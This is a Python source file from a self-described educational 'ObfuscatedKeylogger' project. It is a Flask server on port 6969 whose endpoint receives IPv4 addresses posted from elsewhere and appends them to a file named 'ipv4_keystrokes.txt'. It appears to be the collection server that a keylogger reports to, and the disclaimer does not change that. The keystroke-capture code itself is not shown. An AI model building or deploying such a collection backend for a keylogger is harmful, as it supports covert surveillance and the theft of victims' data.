"""
ObfuscatedKeylogger.py
Author: Alex Zevnoski (Leshenka)
Copyright (c) 2024 Alex Zevnoski (Leshenka)
This file is part of the ObfuscatedKeylogger project, an educational
and experimental project demonstrating obfuscation and data transmission techniques.

DISCLAIMER: This software is intended solely for educational purposes.
The author does not condone or support illegal or unethical use of this software.
"""

from flask import Flask, request, jsonify

app = Flask(__name__)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

def write_ipv4_address_to_file(ipv4_address):
    with open("ipv4_keystrokes.txt", "a") as file:
        file.write(ipv4_address + "\n") 

@app.route('/receive_ip', methods=['POST'])
def receive_ip():
    ipv4_address = request.form.get('ipv4')
    
    if ipv4_address:
        print(f"Received IPv4 address: {ipv4_address}")
        write_ipv4_address_to_file(ipv4_address)
        return jsonify({"message": "IPv4 address received successfully!"}), 200
    else:
        return jsonify({"message": "No IPv4 address provided!"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6969)
